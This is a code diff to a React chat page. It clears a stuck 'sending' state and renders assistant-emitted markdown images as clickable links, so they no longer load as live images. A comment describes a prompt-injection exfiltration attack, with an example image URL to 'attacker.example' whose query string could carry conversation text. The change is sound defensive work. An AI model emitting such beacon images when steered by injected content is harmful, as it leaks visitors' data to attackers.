@@ -242,7 +242,13 @@ export function HostedChatPage({ slug }: HostedChatPageProps) {
   )
 
   const startNew = useCallback(() => {
+    // Closing the EventSource fires nothing -- no `done`, no `onerror` --
+    // and `finish()` is the only place that clears `sending`. Without the
+    // line below, starting a new chat (or deleting the open one) while a
+    // reply is streaming left the composer disabled with a spinner for the
+    // life of the page; the visitor had to reload to type again.
     streamRef.current?.close()
+    setSending(false)
     setConversationId(null)
     setMessages([])
     // Starting fresh cancels any "opening conversation" spinner still on screen.
@@ -768,7 +774,7 @@ function MessageBubble({ message }: { message: PendingMessage }) {
   )
 }
 
-const assistantMarkdownComponents: Components = {
+export const assistantMarkdownComponents: Components = {
   p: ({ children }) => <p className="mb-3 last:mb-0">{children}</p>,
   ul: ({ children }) => <ul className="mb-3 list-disc space-y-1 pl-5 last:mb-0">{children}</ul>,
   ol: ({ children }) => <ol className="mb-3 list-decimal space-y-1 pl-5 last:mb-0">{children}</ol>,
@@ -781,6 +787,26 @@ const assistantMarkdownComponents: Components = {
       className="underline underline-offset-2"
     >
       {children}
+    </a>
+  ),
+  // Assistant output is untrusted. Anyone who can steer the agent -- a
+  // prompt injection planted in a web page it reads, a hostile tool
+  // result, or a visitor who simply asks for it -- can make it emit
+  // `![](https://attacker.example/x.png?d=...)`. Rendering that as a real
+  // <img> makes the visitor's browser fetch the attacker's URL the instant
+  // the bubble paints: a zero-click beacon that leaks the visitor's IP and
+  // user agent, with conversation text encodable in the query string.
+  // Show the reference as a link the visitor has to choose to follow.
+  // (`src` has already been through react-markdown's default URL
+  // transform, so the scheme is http/https.)
+  img: ({ src, alt }) => (
+    <a
+      href={typeof src === 'string' ? src : undefined}
+      target="_blank"
+      rel="noopener noreferrer"
+      className="underline underline-offset-2"
+    >
+      {alt || 'image'}
     </a>
   ),
   code: ({ children }) => (
